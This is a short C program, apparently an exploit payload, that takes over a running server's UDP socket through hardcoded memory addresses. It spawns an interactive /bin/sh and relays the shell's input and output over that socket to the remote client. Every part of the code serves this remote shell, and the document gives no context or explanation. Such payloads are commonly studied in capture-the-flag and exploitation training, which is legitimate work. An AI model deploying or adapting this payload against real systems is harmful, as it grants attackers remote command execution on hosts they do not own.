int main() {
    int *server_sockfd = (int *)0x413134;
    struct sockaddr *client_addr = (struct sockaddr *)0x413170;
    int si[2], so[2];
    pipe(si);
    pipe(so);
    if(!fork()) {
        dup2(si[0], 0);
        dup2(so[1], 1);
        dup2(so[1], 2);
        char *args[3];
        args[0] = "/bin/sh";
        args[1] = "-i";
        args[2] = NULL;
        execve("/bin/sh", args, NULL);
        exit(1);
    }
    char buf[1024];
    if(!fork()) {
        socklen_t addrlen = 0x10;
        while(1) {
            int sz = recvfrom(*server_sockfd, buf, sizeof(buf), 0, client_addr, &addrlen);
            if(sz >= 0) {
                write(si[1], buf, sz);
            } else {
                break;
            }
        }
    } else {
        while(1) {
            int sz = read(so[0], buf, sizeof(buf));
            if(sz >= 0) {
                sendto(*server_sockfd, buf, sz, 0, client_addr, 0x10);
            } else {
                break;
            }
        }
    }
}
